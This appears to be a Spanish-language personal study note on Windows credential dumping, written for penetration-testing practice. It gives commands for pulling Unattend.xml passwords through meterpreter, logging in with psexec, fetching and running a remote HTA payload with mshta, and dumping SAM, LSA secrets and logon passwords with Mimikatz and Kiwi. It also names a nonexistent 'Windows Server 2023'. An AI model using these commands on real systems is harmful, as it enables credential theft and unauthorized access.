 o30-03-2025 18:56
Status: #idea
Tags: [[Windows Credential Dumping]]

- [[#SAM Database|SAM Database]]
- [[#Buscando contraseñas en ficheros de configuración|Buscando contraseñas en ficheros de configuración]]
- [[#Herramientas|Herramientas]]
	- [[#Herramientas#Mimikatz|Mimikatz]]
		- [[#Mimikatz#Ejecutable|Ejecutable]]
		- [[#Mimikatz#Módulo Kiwi en metasploit|Módulo Kiwi en metasploit]]

# Windows Password Hashes

Windows guarda las hashes de las cuentas de usuarios localmente en la base de datos del SAM (Security Accounts Manager).

La autenticación y verificación de las credenciales de usuario son facilitadas por el Local Security Authority (LSA).

Las versiones de Windows mayores que Windows Server 2023, utilizan dos tipos de hashes: **LM y NTLM**. A partir de Windows Vista, se han desactivado las LM y solo se utiliza el NTLM hashing.

## SAM Database

Como hemos dicho anteriormente, las contraseñas hasheadas de todos los usuarios se guardan en esta base de datos.

Esta base de datos se puede copiar mientras el sistema operativo está funcionando.

El kernel mantiene bloqueada esta base de datos, por lo tanto los atacantes normalmente utilizan técnicas de memoria y herramientas para hacer dump desde el proceso LSASS.

En versiones recientes de Windows, la base de datos SAM está encriptada con una syskey.


> [!TIP] Privilegios y LSASS
> Para poder interactuar con el proceso de lsass necesitaremos permisos elevados o de administrador.


## Buscando contraseñas en ficheros de configuración

Windows permite automatizar tareas repetitivas, como la configuración e instalación de Windows en varios sistemas.

Esto normalmente se consigue con la utilidad "Unattended Windows Setup", que nos permite automatizar la instalación masiva de sistemas Windows.

Esta herramienta utiliza ficheros de configuración que contiene configuraciones específicas, y credenciales de cuentas válidas, especialmente, la contraseña de la cuenta Administrator.

Si estos ficheros se dejan en el sistema después de la instalación, podrán revelar credenciales de usuarios que podrían ser utilizadas por atacantes para autenticarse en el sistema.

Los directorios de estos ficheros son:

- **C:\Windows\Panther\Unattend.xml
- **C:\Windows\Panther\Autounattend.xml**

Estas contraseñas pueden estar presentes con encoding base64.

Para conseguir este fichero en nuestro sistema objetivo, tendríamos que tener acceso a el, ya sea con una sesión de meterpreter o a través de otros exploits.

Si tenemos una sesión de meterpreter, podremos descargar el fichero con el comando download:

```shell
download C:\Windows\Panther\Unattend.xml
```

Una vez tengamos el fichero, podremos hacer un cat y buscar las contraseñas, sobre todo del usuario de administración. Veremos que es una string en base64. Si la metemos en un fichero txt, por ejemplo password.txt, podremos usar la utilidad base64 que ya viene en kali directamente:

```shell
base64 -d password.txt
```

Y esto nos dará la contraseña. Puede que no sea válida, pero podremos probarla con psexec.py:

```shell
psexec.py Administrator@10.10.10.10
```

Si todo sale bien, deberíamos ser NT AUTHORITY\SYSTEM.

## Herramientas

Utilidades que podremos usar serán [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1), que nos permitirá ver si existen estos ficheros, ya que es un script que se encarga de ejecutar un audit.

Si queremos ejecutar un cmd como administrador en Windows podremos usar el comando: 

```powershell
runas.exe /user:administrator cmd
```

Si queremos ejecutar una payload desde el cmd de privilegios elevados podemos usar el exploit [**hta_server**](https://www.rapid7.com/db/modules/exploit/windows/misc/hta_server/), que nos proporcionará una url que podremos acceder desde nuestro powershell para conseguir una sesión de meterpreter.

Después desde nuestro powershell ejecutaremos:

```powershell
mshta.exe http://10.10.49.4:8080/Tomvj9c.hta
```

### Mimikatz

Mimikatz es una herramienta para la post-explotación que nos permite extraer contraseñas clear-text.

Lo que hace es extraer hashes del proceso lsass.exe, que es donde se cachean estas.

Podemos ejecutar su ejecutable, o si tenemos una sesión de meterpreter, utilizar el módulo Kiwi.

#### Ejecutable

En Kali tenemos el ejecutable de Mimikatz ya instalado. Se encuentra en la ruta **usr/share/windows-resources/mimikatz/x64/mimikatz.exe**.  

Si tenemos una sesión de meterpreter, podremos subirlo con el comando upload en la carpeta **Temp**, y posteriormente, invocar una shell para ejecutarlo.

```terminal
shell

.\mimikatz.exe
```

Comprobaremos que tenemos los permisos suficientes con este comando:

```terminal
privilege::debug
```

Si nos devuelve un **Privilege '20' OK**, nos está indicando que tenemos suficientes privilegios para hacer el dumping.

**Recuerda hacer migrate al proceso de lsass para tener el NT AUTHORITY\SYSTEM.**

Esto lo podremos hacer con el comando:

```terminal
lsadump::sam
lsadump::secrets
```

En este caso, el ejecutable nos da más información de la que nos proporcionará Kiwi.

También podemos probar suerte y ver si nos devuelve contraseñas en texto plano:

```terminal
sekurlsa::logonpasswords
```

#### Módulo Kiwi en metasploit

Para cargar el módulo tendremos que hacer: 

```terminal
load kiwi
```

Y posteriormente, se pueden usar varios comandos para conseguir dumpear las hashes, pero entre ellos está:

```terminal
creds_all
```

También podremos usar **lsa_dump_sam** para volcar la base de datos SAM, como vimos anteriormente: 

```terminal
// Vuelca la base de datos SAM
lsa_dump_sam

// Vuelca secretos, donde a veces se pueden encontrar datos interesantes
lsa_dump_secrets
```

#### Post exploitation

Después de tener los hashes, podremos realizar Pass The Hash. En esta sección linkeada se explica correctamente el proceso, y como lo podemos realizar.

[[Vulnerability Assessment#Pass The Hash]]



---
# Backlinks

```dataview
LIST
FROM [[]]
SORT file.name ASC
```
